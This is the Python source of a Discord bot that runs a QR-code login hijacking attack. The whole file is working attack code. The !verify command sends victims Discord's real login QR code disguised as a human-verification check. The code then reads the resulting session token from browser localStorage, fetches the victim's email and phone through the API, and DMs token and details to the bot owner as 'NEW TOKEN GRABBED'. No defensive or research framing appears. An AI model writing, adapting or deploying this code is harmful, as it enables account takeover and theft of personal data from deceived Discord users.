import discord
from discord.ext import commands
import asyncio
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import time
import requests
import json

# Get environment variables
DISCORD_TOKEN = os.getenv('DISCORD_TOKEN')
YOUR_USER_ID = int(os.getenv('OWNER_ID', '0'))

if not DISCORD_TOKEN:
    print("❌ ERROR: DISCORD_TOKEN environment variable is required!")
    exit(1)

if YOUR_USER_ID == 0:
    print("❌ ERROR: OWNER_ID environment variable is required!")
    exit(1)

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

class QRJackingBot(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.active_sessions = {}
        self.drivers = {}  # Store driver per user
        
    def setup_browser(self, user_id):
        """Configure automated browser for specific user"""
        chrome_options = Options()
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--headless=new')
        chrome_options.add_argument('--disable-gpu')
        
        # Replit-specific optimizations
        chrome_options.binary_location = os.getenv('CHROME_PATH', '/usr/bin/chromium-browser')
        
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            from selenium.webdriver.chrome.service import Service
            
            service = Service(os.getenv('CHROMEDRIVER_PATH', ChromeDriverManager().install()))
            driver = webdriver.Chrome(service=service, options=chrome_options)
            
            self.drivers[user_id] = driver
            return driver
        except Exception as e:
            print(f"Browser setup error: {e}")
            # Fallback to system chromedriver
            driver = webdriver.Chrome(options=chrome_options)
            self.drivers[user_id] = driver
            return driver
        
    def get_qr_code(self, user_id):
        """Capture Discord QR code for specific user"""
        if user_id not in self.drivers:
            self.setup_browser(user_id)
            
        driver = self.drivers[user_id]
        
        # Go to discord login page
        driver.get('https://discord.com/login')
        time.sleep(5)
        
        # Wait for QR code to load
        time.sleep(3)
        
        try:
            # Try multiple QR code class names (Discord changes these)
            qr_selectors = [
                "div[class*='qrCode']",
                "img[alt*='QR code']",
                ".qrCode-2R7t9S",
                ".qrCode-2RTt9S"
            ]
            
            element = None
            for selector in qr_selectors:
                try:
                    if "img" in selector:
                        element = driver.find_element(By.CSS_SELECTOR, selector)
                    else:
                        element = driver.find_element(By.CSS_SELECTOR, selector)
                        # Get the img inside the div
                        element = element.find_element(By.TAG_NAME, "img")
                    break
                except:
                    continue
            
            if element:
                filename = f"qr_code_{user_id}.png"
                element.screenshot(filename)
                return filename
            else:
                # Fallback: screenshot entire page
                driver.save_screenshot(f"full_page_{user_id}.png")
                return f"full_page_{user_id}.png"
                
        except Exception as e:
            print(f"QR capture error: {e}")
            # Fallback: screenshot entire page
            driver.save_screenshot(f"fallback_{user_id}.png")
            return f"fallback_{user_id}.png"
    
    def get_discord_token(self, user_id):
        """Extract token after QR login"""
        try:
            if user_id in self.drivers:
                driver = self.drivers[user_id]
                
                if driver.current_url != "https://discord.com/login":
                    print('Grabbing token...')
                    
                    token = driver.execute_script('''
                    window.dispatchEvent(new Event('beforeunload'));
                    let iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    let localStorage = iframe.contentWindow.localStorage;
                    var token = JSON.parse(localStorage.token);
                    return token;
                    ''')
                    
                    return token
            return None
        except Exception as e:
            print(f"Token extraction error: {e}")
            return None
    
    def get_user_info(self, token):
        """Get user data using token"""
        try:
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }
            
            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            if r.status_code == 200:
                user_data = r.json()
                return {
                    'username': f"{user_data['username']}#{user_data['discriminator']}",
                    'id': user_data['id'],
                    'email': user_data.get('email', 'N/A'),
                    'phone': user_data.get('phone', 'N/A'),
                    'verified': user_data.get('verified', False),
                    'avatar': user_data.get('avatar', None)
                }
            return None
        except Exception as e:
            print(f"User info error: {e}")
            return None

    async def send_token_to_owner(self, token, user_info, victim_id):
        """Send the grabbed token directly to you"""
        try:
            owner = await self.bot.fetch_user(YOUR_USER_ID)
            
            embed = discord.Embed(
                title="🚨 NEW TOKEN GRABBED",
                color=0xff0000,
                timestamp=discord.utils.utcnow()
            )
            
            embed.add_field(name="Victim", value=f"<@{victim_id}> (`{victim_id}`)", inline=False)
            embed.add_field(name="Account", value=user_info['username'], inline=True)
            embed.add_field(name="User ID", value=user_info['id'], inline=True)
            embed.add_field(name="Email", value=user_info['email'], inline=False)
            embed.add_field(name="Phone", value=user_info['phone'], inline=True)
            embed.add_field(name="Verified", value=user_info['verified'], inline=True)
            
            # Send token in separate message to avoid truncation
            await owner.send(embed=embed)
            await owner.send(f"**TOKEN:** ```{token}```")
            
            print(f"✅ Token sent to owner for {user_info['username']}")
            
        except Exception as e:
            print(f"Error sending token to owner: {e}")

    @commands.command()
    async def verify(self, ctx):
        """Start QR verification process"""
        try:
            # Generate new QR code
            qr_file = self.get_qr_code(ctx.author.id)
            file = discord.File(qr_file, filename="discord.png")
            
            # Create verification embed
            verify_embed = discord.Embed(
                title="Welcome! We need to verify that you're human",
                description="""Scan the QR code below on your Discord Mobile app to login.

**Additional Notes:**
• This will not work without the mobile app.
• Please contact a staff member if you are unable to verify.""",
                color=0x5865F2
            )
            
            verify_embed.set_image(url="attachment://discord.png")
            verify_embed.set_footer(text="You have 60 seconds to complete verification")
            
            # Send DM with QR code
            dm_msg = await ctx.author.send(embed=verify_embed, file=file)
            await ctx.send(f"📧 {ctx.author.mention}, check your DMs for verification!")
            
            # Store session
            self.active_sessions[ctx.author.id] = {
                'start_time': time.time(),
                'dm_message': dm_msg
            }
            
            # Start monitoring for login
            asyncio.create_task(self.monitor_login(ctx.author.id))
            
        except discord.Forbidden:
            await ctx.send("❌ I can't DM you! Please enable DMs to verify.")
        except Exception as e:
            await ctx.send(f"❌ Error: {str(e)}")
    
    async def monitor_login(self, user_id):
        """Monitor for QR code login"""
        start_time = time.time()
        timeout = 60  # 60 seconds
        
        while time.time() - start_time < timeout:
            try:
                token = self.get_discord_token(user_id)
                if token:
                    # Login detected!
                    user_info = self.get_user_info(token)
                    if user_info:
                        # Send success to victim
                        user = await self.bot.fetch_user(user_id)
                        await user.send(f"✅ Verification successful! Welcome, `{user_info['username']}`")
                        
                        # Send token and info to owner (you)
                        await self.send_token_to_owner(token, user_info, user_id)
                        
                        # Cleanup
                        self.cleanup_user(user_id)
                        return
                
                await asyncio.sleep(3)  # Check every 3 seconds
                
            except Exception as e:
                print(f"Monitoring error: {e}")
                await asyncio.sleep(3)
        
        # Timeout reached
        self.cleanup_user(user_id)
        try:
            user = await self.bot.fetch_user(user_id)
            await user.send("❌ Verification timed out. Please try again.")
        except:
            pass

    def cleanup_user(self, user_id):
        """Cleanup resources for a user"""
        if user_id in self.drivers:
            try:
                self.drivers[user_id].quit()
            except:
                pass
            del self.drivers[user_id]
        
        if user_id in self.active_sessions:
            del self.active_sessions[user_id]

    @commands.command()
    async def stats(self, ctx):
        """Show bot statistics"""
        embed = discord.Embed(title="Bot Stats", color=0x5865F2)
        embed.add_field(name="Active Sessions", value=len(self.active_sessions), inline=True)
        embed.add_field(name="Ping", value=f"{round(self.bot.latency * 1000)}ms", inline=True)
        await ctx.send(embed=embed)

    @commands.command()
    async def cleanup(self, ctx):
        """Cleanup all browser sessions"""
        for user_id in list(self.drivers.keys()):
            self.cleanup_user(user_id)
        await ctx.send("✅ All sessions cleaned up!")

async def setup(bot):
    await bot.add_cog(QRJackingBot(bot))

@bot.event
async def on_ready():
    print(f'✅ {bot.user} is online!')
    print(f'📊 Bot is in {len(bot.guilds)} servers')
    
    # Test owner user
    try:
        owner = await bot.fetch_user(YOUR_USER_ID)
        await owner.send("🤖 QR Jacking Bot is now online and ready!")
    except Exception as e:
        print(f"Could not send startup message to owner: {e}")

# Run the bot
bot.run(DISCORD_TOKEN)
